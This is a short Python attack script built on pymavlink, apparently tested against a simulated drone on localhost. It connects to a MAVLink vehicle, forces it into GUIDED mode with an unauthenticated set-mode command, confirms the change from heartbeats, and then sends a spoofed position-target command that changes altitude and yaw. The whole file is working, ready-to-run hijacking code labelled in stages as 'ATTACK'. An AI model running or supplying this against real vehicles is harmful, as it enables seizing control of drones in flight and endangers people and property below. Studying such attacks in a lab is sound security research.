import time
import math # <-- Make sure this is imported
from pymavlink import mavutil


CONNECTION_STRING = 'udp:127.0.0.1:14550'
WAIT_BEFORE_ATTACK = 5
GUIDED_MODE_COPTER = 4


ATTACK_ALT_ONLY = 70
ATTACK_YAW_DEGREES = 45 # Face North-East
ATTACK_YAW_RADIANS = math.radians(ATTACK_YAW_DEGREES)


# --- Main Attack Logic ---
print(f"Connecting to vehicle on: {CONNECTION_STRING}")
try:
    master = mavutil.mavlink_connection(CONNECTION_STRING)
except Exception as e:
    print(f"Failed to connect: {e}")
    exit()

print("Waiting for heartbeat...")
master.wait_heartbeat()
print(f"Heartbeat from system (system {master.target_system} component {master.target_component})")

print(f"Waiting {WAIT_BEFORE_ATTACK} seconds before launching attack...")
time.sleep(WAIT_BEFORE_ATTACK)

# --- STAGE 1: Force drone into GUIDED mode ---
print("\n!!! ATTACK STAGE 1: Forcing vehicle into GUIDED mode !!!")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1,  # Custom mode
    GUIDED_MODE_COPTER,
    0, 0, 0, 0, 0  # Unused parameters
)

# --- NEW: Loop and verify the mode change from HEARTBEAT messages ---
print("Waiting for mode change confirmation...")
mode_changed = False
for _ in range(10): # Try for a few seconds
    msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
    if msg and msg.custom_mode == GUIDED_MODE_COPTER:
        print("Mode change to GUIDED successful!")
        mode_changed = True
        break
    time.sleep(0.5)

if not mode_changed:
    print("Mode change failed or timed out. Aborting attack.")
    exit()

time.sleep(1) # Give the vehicle a moment to stabilize in the new mode

# --- STAGE 2:
print("\n!!! ATTACK STAGE 2: Sending ALT + YAW spoof command !!!")
master.mav.set_position_target_global_int_send(
    0, 
    master.target_system, 
    master.target_component,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
    0b0000101111111011, # type_mask (Decimal: 3027)
    0, # lat_int (Ignored)
    0, # lon_int (Ignored)
    ATTACK_ALT_ONLY,       # alt (USED)
    0, 0, 0, 
    0, 0, 0,
    ATTACK_YAW_RADIANS,    # yaw (USED)
    0)
